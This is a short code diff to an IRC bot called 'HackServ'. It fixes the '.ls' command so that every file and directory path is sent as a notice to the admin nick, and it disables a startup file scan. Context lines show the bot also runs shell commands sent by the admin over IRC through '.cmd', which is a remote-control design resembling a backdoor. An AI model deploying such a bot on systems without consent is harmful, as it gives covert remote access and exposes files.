@@ -315,11 +315,11 @@ def fileList(): # List files in current directory
         for name in files:
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print(os.path.join(root, name)) # Print the file list to screen if debugmode is enabled.
-            return os.path.join(root, name)
+            sendntc(os.path.join(root, name), adminname)
         for name in dirs:
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print(os.path.join(root, name)) # Print the dir list to screen if debugmode is enabled.
-            return os.path.join(root, name)
+            sendntc(os.path.join(root, name), adminname)
 
 def srtChk(): # Startup Check. (Still in testing!)
     name = str(sys.argv[0])
@@ -750,7 +750,7 @@ def main(): # This is the main function for all of the bot controls.
 
                 # Respond to '.ls' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.ls') != -1:
-                    sendntc(format(fileList()), adminname)
+                    fileList()
                 
                 # Respond to '.cmd [shell command]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.cmd') != -1:
@@ -811,7 +811,7 @@ try: # Here is where we actually start the Bot.
         if os.path.isfile('./hsConfig.py'): # Check if the config file exists.
             if debugmode: # If debugmode is True, msgs will print to screen.
                 print("hsConfig.py found. Starting HackServ...")
-            fileList() # Get list of files in current directory.
+            #fileList() # Get list of files in current directory.
             connect() # Connect to server.
             
         else:
